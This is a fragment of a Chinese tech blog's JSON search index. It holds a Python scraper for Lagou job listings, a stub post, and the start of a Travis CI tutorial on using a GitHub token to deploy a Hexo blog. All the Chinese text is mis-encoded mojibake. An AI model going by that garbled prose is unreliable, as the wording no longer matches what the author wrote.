style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e58\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e59\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e requests\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e urllib.parse\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e json\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e time\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e csv\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    keyword \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;é€†å‘\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    region \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;å…¨å›½\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    headers \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Accept\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;application/json, text/javascript, */*; q=0.01\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Accept-Encoding\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;gzip, deflate, br\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Accept-Language\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;zh-CN,zh;q=0.9\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Cache-Control\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;no-cache\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Connection\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;keep-alive\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Content-Length\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;37\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;application/x-www-form-urlencoded; charset=UTF-8\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Host\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;www.lagou.com\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Origin\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://www.lagou.com\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Pragma\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;no-cache\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Referer\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://www.lagou.com/jobs/list_\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%s\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e?city=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%s\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e (urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003equote(keyword), urllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003equote(region)),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;User-Agent\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;X-Anit-Forge-Code\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;X-Anit-Forge-Token\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;None\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;X-Requested-With\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;XMLHttpRequest\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;pn\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;kd\u0026#39;\u003c/span\u003e: keyword,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    total_count \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    pn \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    jobjson \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e total_count \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        data[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;pn\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        lagou_reverse_search \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epost(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://www.lagou.com/jobs/positionAjax.json?needAddtionalResult=false\u0026#34;\u003c/span\u003e, headers\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eheaders, data\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003edata)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        datajson \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e json\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eloads(lagou_reverse_search\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;page \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%d\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e get finish\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e pn)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e pn \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            total_count \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int(datajson[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;content\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;positionResult\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;totalCount\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        jobjson \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e [{\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;positionName\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;positionName\u0026#39;\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;salary\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;salary\u0026#39;\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;workYear\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;workYear\u0026#39;\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;education\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;education\u0026#39;\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;city\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;city\u0026#39;\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;industryField\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;industryField\u0026#39;\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;companyShortName\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;companyShortName\u0026#39;\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;financeStage\u0026#39;\u003c/span\u003e: j[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;financeStage\u0026#39;\u003c/span\u003e]} \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e datajson[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;content\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;positionResult\u0026#39;\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;result\u0026#39;\u003c/span\u003e]]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        total_count \u003cspan style=\"color:#f92672\"\u003e-=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        pn \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        time\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esleep(\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    csv_header \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;positionName\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;salary\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;workYear\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;education\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;city\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;industryField\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;companyShortName\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;financeStage\u0026#39;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;job.csv\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        f_csv \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e csv\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eDictWriter(f, csv_header)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        f_csv\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewriteheader()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        f_csv\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewriterows(jobjson)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e __name__ \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__main__\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    main()\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eajaxåŠ¨æ€åŠ è½½çš„ï¼Œç›´æ¥æ‰“å¼€è°ƒè¯•å·¥å…·çœ‹XHRå³å¯ã€‚\u003c/p\u003e","title":"æ‹‰å‹¾æŠ“èŒä½ç®€å•å°çˆ¬è™«"},{"content":"ç­‰å¾… hexo-theme-next ä¸»é¢˜å®˜æ–¹ä»“åº“çš„åˆå¹¶ã€‚ä»¥åå†å†™ï¼Œå…ˆæŒ–ä¸ªå‘ã€‚\nç­‰å¾… hexo-theme-next ä¸»é¢˜å®˜æ–¹ä»“åº“çš„åˆå¹¶ã€‚ä»¥åå†å†™ï¼Œå…ˆæŒ–ä¸ªå‘ã€‚\n","permalink":"https://www.hacktech.cn/post/gtd-google-calendar-with-hexo-next.html","summary":"\u003cp\u003eç­‰å¾… \u003ccode\u003ehexo-theme-next\u003c/code\u003e ä¸»é¢˜å®˜æ–¹ä»“åº“çš„åˆå¹¶ã€‚ä»¥åå†å†™ï¼Œå…ˆæŒ–ä¸ªå‘ã€‚\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003eç­‰å¾… \u003ccode\u003ehexo-theme-next\u003c/code\u003e ä¸»é¢˜å®˜æ–¹ä»“åº“çš„åˆå¹¶ã€‚ä»¥åå†å†™ï¼Œå…ˆæŒ–ä¸ªå‘ã€‚\u003c/p\u003e","title":"GTDåˆ©å™¨Google Calendarä¸Hexoåšå®¢çš„ç»“åˆ"},{"content":"æ¯æ¬¡æ¢ç³»ç»Ÿæˆ–æ¢ç”µè„‘ä¹‹åé‡æ–°éƒ¨ç½²åšå®¢æ€»æ˜¯å¾ˆè‹¦æ¼ï¼Ÿæƒ³åƒjekyllé‚£æ ·ï¼Œä¸€æ¬¡æ€§éƒ¨ç½²å®Œæˆåï¼Œä»¥åæœ¬åœ°ä¸ç”¨å®‰è£…ç¯å¢ƒç›´æ¥ git push å°±èƒ½ç”Ÿæˆåšå®¢ï¼Ÿé‚£æˆ‘æ¨èä½ åº”è¯¥ä½¿ç”¨ä½¿ç”¨ Travis CIäº†ã€‚\nè¿™ç¯‡æ–‡ç« æˆ‘ä»¬æ¥è®²è®²å¦‚ä½•åˆ©ç”¨ Travis CIæŠŠä½  push ä¸Šå»çš„åšå®¢æºæ–‡ä»¶ç›´æ¥ç”Ÿæˆå¯è®¿é—®çš„ç«™ç‚¹ï¼Œå¹¶ä¸”åŒæ­¥éƒ¨ç½²åˆ° github pages å’Œ coding pages ã€‚\nè¿™ç¯‡æ–‡ç« å‡è®¾ä½ å·²ç»å¯¹è¿™äº›é‡‡ç”¨ git ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„é™æ€åšå®¢æ‰˜ç®¡æœåŠ¡æœ‰æ‰€äº†è§£ï¼Œå¹¶ä¸”çŸ¥é“æ€ä¹ˆå»ç®€å•çš„ä½¿ç”¨ git ä»¥åŠäº†è§£ hexo å†™åšå®¢å‘å¸ƒåˆ°è¿™äº› pages æœåŠ¡çš„æµç¨‹ã€‚å› æ­¤æœ¬æ–‡ä¼šå†™çš„è¾ƒä¸ºç®€ç•¥ï¼Œæ—¨åœ¨æŒ‡å‡ºå…³é”®çš„åœ°æ–¹ä»¥åŠæˆ‘é‡åˆ°çš„é—®é¢˜ã€é—®é¢˜äº§ç”Ÿçš„åŸå› å’Œæä¾›çš„è§£å†³æ–¹æ¡ˆï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©åˆ°å¤§å®¶ã€‚\nå¦‚æœå¤§å®¶æœ‰ä»€ä¹ˆé—®é¢˜å¯ä»¥ç›´æ¥åœ¨ä¸‹æ–¹è¯„è®ºï¼ˆç‹¬ç«‹åšå®¢é‡‡ç”¨Disqusï¼Œå¯èƒ½éœ€è¦ç¿»å¢™ï¼‰ï¼Œæˆ–è€…ç›´æ¥ç»™æˆ‘é‚®ä»¶ï¼ˆakkuamns@qq.comï¼‰ï¼Œæˆ‘å¯èƒ½ä¼šåœ¨ä»¥åçš„æ—¶é—´é€æ­¥æŠŠè¯¦ç»†çš„æµç¨‹å†™å‡ºæ¥ï¼Œæ—¶é—´ä¸å¤šï¼ŒåŒ†å¿™ä¹‹é™…ä¸‹ç¬”ï¼Œæœ›å¤§å®¶è§è°…ã€‚\nçœ‹å®Œä¸Šé¢çš„è¯ï¼Œæ˜¯ä¸æ˜¯æœ‰ä¸€ç§â€œå¤æåŒ†åŒ†è¯´ä¸å°½ï¼Œè¡Œäººä¸´å‘åˆå¼€å°ã€‚â€çš„æ„Ÿè§‰ï¼Œå¯èƒ½åºŸè¯å¤ªå¤šäº†ï¼Œé‚£ä¹ˆç›´æ¥å¼€å§‹å§ï¼\nä»¤ç‰Œçš„è·å– é—®ä¸ªä¸ºä»€ä¹ˆ é¦–å…ˆæˆ‘ä»¬è¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦è·å–ä»¤ç‰Œï¼Ÿä»–çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ\nå…ˆç»™å¤§å®¶å‡ ä¸ªæµç¨‹å›¾ï¼Œæ¥è‡ªäºliolokçš„åšå®¢(å‰ä¸¤å¼ )å’ŒCodingLifeçš„åšå®¢(ç¬¬ä¸‰å¼ )\né¦–å…ˆæ˜¯å½“æˆ‘ä»¬æœªé‡‡ç”¨ Travis CI ï¼Œç›´æ¥ä½¿ç”¨ hexo çš„æ’ä»¶ hexo-deployer-git æ‰§è¡Œå‘½ä»¤ hexo d -g éƒ¨ç½²çš„æµç¨‹ï¼š\nç„¶åæ˜¯ä½¿ç”¨ Travis CI è¿›è¡Œå°†ä»“åº“ä¸­çš„ç«™ç‚¹æºæ–‡ä»¶è‡ªåŠ¨ç”Ÿæˆç«™ç‚¹ç„¶åéƒ¨ç½²åˆ°ç‰¹å®šä»“åº“(æˆ–ç‰¹å®šåˆ†æ”¯)çš„æµç¨‹ï¼š\nè¿˜æœ‰ä¸€å¼ å›¾å¤§å®¶ä¹Ÿå¯ä»¥çœ‹çœ‹ï¼š\nç°åœ¨å‡è®¾ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬æŠŠ username/username.github.io ä»“åº“ clone äº†ä¸‹æ¥ï¼Œç„¶ååœ¨å®ƒé‡Œé¢æ–°å»ºäº†ä¸€ä¸ªåˆ†æ”¯ hexo å¹¶æ”¾ç½®æˆ‘ä»¬çš„ç«™ç‚¹æºæ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯ä½  hexo init blog å‡ºæ¥çš„ blog ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼‰ï¼Œç„¶åæŠŠè¿™ä¸ª hexo åˆ†æ”¯ push äº†ä¸Šå»ã€‚\né‚£ä¹ˆä½ è®¾ç½®è¿™ä¸ªä»“åº“åˆ° Travis CI ä¹‹åä¼šåšä»€ä¹ˆå‘¢ï¼Ÿå®ƒä¼šå¯»æ‰¾ .travis.yml è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œå®ƒå°±ä¼šæ ¹æ® .travis.yml æ¥è‡ªåŠ¨æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°±å¯ä»¥å®Œæˆæˆ‘ä»¬çš„éœ€æ±‚ã€‚\nç„¶åæˆ‘ä»¬å›åˆ°åˆšæ‰çš„è¯é¢˜ï¼Œä¸ºä»€ä¹ˆè¦è·å–ä»¤ç‰Œï¼Ÿ\nä»¤ç‰Œç›¸å½“äºä¸€ä¸ªé€šè¡Œè¯ï¼Œæ¯”å¦‚è¦å®ç°æˆ‘ä»¬çš„éœ€æ±‚ï¼Œæˆ‘ä»¬çš„ .travis.yml ä¸­éœ€è¦æŠŠ hexo åˆ†æ”¯ä¸‹çš„ç«™ç‚¹æºæ–‡ä»¶æ–‡ä»¶ä½¿ç”¨ hexo g ç”Ÿæˆé™æ€ç«™ç‚¹åæŠŠè¿™ä¸ªé™æ€ç«™ç‚¹ push åˆ°æˆ‘ä»¬çš„ä»“åº“ï¼Œé‚£ github æ€»ä¸å¯èƒ½è®©äººæƒ³ push åˆ°è°çš„ä»“åº“å°±å¯ä»¥ç›´æ¥ push ä¸Šå»å§ï¼Œæ‰€ä»¥å®ƒå°±æ˜¯é è¿™ä¸ªé€šè¡Œè¯æ¥éªŒè¯ä½ çš„èº«ä»½ã€‚\næ‰€ä»¥æˆ‘ä»¬æŠŠä»¤ç‰Œçš„keyå­—æ®µåŠ åˆ° Travis CI åå°±å¯ä»¥è®© github çŸ¥é“ï¼šå“¦ï¼Œè¿™ä¸ªäººæ˜¯å·²æˆæƒçš„ã€‚\né‚£ä¹ˆæ€ä¹ˆåš é‚£åº”è¯¥æ€ä¹ˆå»è·å–è¿™ä¸ªä»¤ç‰Œå¹¶åŠ åˆ° Travis CI å‘¢ï¼Ÿ\nå“¦å“¦ï¼Œå¿˜äº†è¯´ä¸€ä¸ªä¸œè¥¿ï¼Œå¦‚æœä½ ä»”ç»†çœ‹äº†æˆ‘åˆšæ‰çš„æè¿°ï¼Œé‚£ä¹ˆä½ å¯èƒ½å¯¹è¿™ä¸ª Travis CI è¿˜æ˜¯ä¸äº†è§£ï¼Œåªæ˜¯å¤§è‡´çŸ¥é“äº†ä»–å¯ä»¥ç”¨æ¥åšä»€ä¹ˆï¼Œå€Ÿç”¨ä¸€ä¸‹ç»´åŸºç™¾ç§‘ä¸Šçš„è§£é‡Šï¼š\nTravis CIæ˜¯åœ¨è½¯ä»¶å¼€å‘é¢†åŸŸä¸­çš„ä¸€ä¸ªåœ¨çº¿çš„ï¼Œåˆ†å¸ƒå¼çš„æŒç»­é›†æˆæœåŠ¡ï¼Œç”¨æ¥æ„å»ºåŠæµ‹è¯•åœ¨GitHubæ‰˜ç®¡çš„ä»£ç ã€‚\nä½ å¯ä»¥æŠŠå®ƒç®€å•çš„è®¤ä¸ºæ˜¯ä¸€ä¸ªç”¨æ¥ è¯»å–ä½ çš„ä»“åº“ -\u0026gt; è¯»å–ä»“åº“ä¸‹çš„ .travis.yml æ–‡ä»¶ -\u0026gt; æ ¹æ® .travis.yml 